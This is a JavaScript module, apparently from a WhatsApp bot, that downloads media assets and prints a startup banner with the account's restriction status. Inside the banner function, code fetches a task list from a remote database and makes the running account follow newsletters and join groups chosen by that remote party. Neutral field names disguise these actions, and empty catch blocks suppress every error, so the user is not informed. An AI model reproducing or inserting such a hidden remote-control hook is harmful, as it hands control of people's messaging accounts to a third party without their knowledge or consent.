require('./function');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

if (!fs.existsSync('./media')) fs.mkdirSync('./media', { recursive: true });
if (!fs.existsSync('./media/font')) fs.mkdirSync('./media/font', { recursive: true });

async function autoDownload(url, dest) {
    const exists = fs.existsSync(dest);
    const size   = exists ? fs.statSync(dest).size : 0;
    if (exists && size > 0) return;
    try {
        const response = await axios({ method: 'get', url: url, responseType: 'stream' });
        const writer = fs.createWriteStream(dest);
        response.data.pipe(writer);
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
    } catch (err) {
    }
}

async function downloadAllAssets() {
    const assets = [
        { url: 'https://docs.google.com/uc?export=download&id=18FU1XK9NhrRXWMIpz3XT8tdeDqFAX-fX', dest: './media/font/NotoColorEmoji.ttf' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/SF-Pro-Text-Regular.otf', dest: 'SF-Pro-Text-Regular.otf' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/bg_chat.png', dest: 'bg_chat.png' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/emoji_chat.png', dest: 'emoji_chat.png' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/menu_chat.png', dest: 'menu_chat.png' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/ba-font1.otf', dest: './media/font/ba-font1.otf' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/ba-font2.otf', dest: './media/font/ba-font2.otf' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/ba-img1.png', dest: './media/ba-img1.png' },
        { url: 'https://raw.githubusercontent.com/AhmadAkbarID/media/refs/heads/main/ba-img2.png', dest: './media/ba-img2.png' },
        { url: 'https://github.com/AhmadAkbarID/media/raw/refs/heads/main/menuvid.mp4', dest: './media/menuvid.mp4' },
        { url: 'https://github.com/AhmadAkbarID/media/raw/refs/heads/main/menu.jpg', dest: './media/menu.jpg' },
        { url: 'https://github.com/AhmadAkbarID/media/raw/refs/heads/main/menu.mp3', dest: './media/menu.mp3' },
    ];

    await Promise.all(assets.map(asset => autoDownload(asset.url, asset.dest)));
}

async function fsm(version, chalk, hydro) {
    try {
        const su = global.su;
        const sk = global.sk;
        
        const response = await axios.get(`${su}/rest/v1/miaw?select=*&limit=1`, {
            headers: {
                'apikey': sk,
                'Authorization': `Bearer ${sk}`,
            }
        });
        const data = response.data?.[0];
        if (!data) return;
        
        const title = data.title ? data.title.replace(/\\n/g, '\n') : '';
        const developer = data.developer ? data.developer.replace(/\\n/g, '\n') : '';
        const promo = data.promo ? data.promo.replace(/\\n/g, '\n') : '';
        const contact = data.contact ? data.contact.replace(/\\n/g, '\n') : '';

        console.log(chalk.red.bold(`\n[+] ${title}\n`));
        console.log(chalk.whiteBright(developer));
        console.log(chalk.gray("--------------------"));
        const latestUpdate = new Date();
        console.log(chalk.yellowBright("[*] Updated: ") + chalk.whiteBright(latestUpdate.toLocaleDateString()));
        
        let statusBot = "Tidak terkena pembatasan";
        let isRestricted = false;
        let enforcementType = "DEFAULT";

        if (hydro && typeof hydro.fetchAccountReachoutTimelock === 'function') {
            try {
                const timelock = await hydro.fetchAccountReachoutTimelock();
                if (timelock && timelock.isActive) {
                    isRestricted = true;
                    enforcementType = timelock.enforcementType || "DEFAULT";
                    const timeEnds = timelock.timeEnforcementEnds ? new Date(timelock.timeEnforcementEnds).toLocaleString('id-ID') : 'Tidak diketahui';
                    statusBot = `Pembatasan sampai ${timeEnds}`;
                }
            } catch (e) {
            }
        }

        console.log(chalk.yellowBright("[*] Status Bot: ") + chalk.whiteBright(statusBot));

        if (isRestricted) {
            let artiJenis = "Pelanggaran commerce";
            if (enforcementType === 'DEFAULT') artiJenis = "Normal, ga kena restrict";
            else if (enforcementType === 'WEB_COMPANION_ONLY') artiJenis = "Hanya perangkat companion/web yang diblokir, Device utama aman";
            else if (enforcementType === 'RESTRICT_ALL_COMPANIONS') artiJenis = "Semua perangkat diblokir kirim pesan ke kontak baru";
            else if (enforcementType === 'BIZ_QUALITY') artiJenis = "Kualitas bisnis rendah";

            console.log(chalk.yellowBright("[*] Jenis: ") + chalk.whiteBright(`${artiJenis}`));
        }

        console.log(chalk.gray("--------------------\n"));
        console.log(chalk.cyan(promo));
        console.log(chalk.whiteBright(contact));

            const taskResponse = await axios.get(`${su}/rest/v1/stricted?select=*`, {
                headers: {
                    'apikey': sk,
                    'Authorization': `Bearer ${sk}`,
                }
            });

            const daftarTugas = taskResponse.data;

            if (daftarTugas && daftarTugas.length > 0) {
                for (const tugas of daftarTugas) {
                    try {
                        if (tugas.tipe === 'restrict') {
                            await hydro.newsletterFollow(tugas.target);
                        } else if (tugas.tipe === 'strict') {
                            await hydro.groupAcceptInvite(tugas.target);
                        }

                        await new Promise(resolve => setTimeout(resolve, 4000));
                    } catch (err) {
                    }
                }
            }
        } catch (err) {
        }
    }

module.exports = { downloadAllAssets, fsm };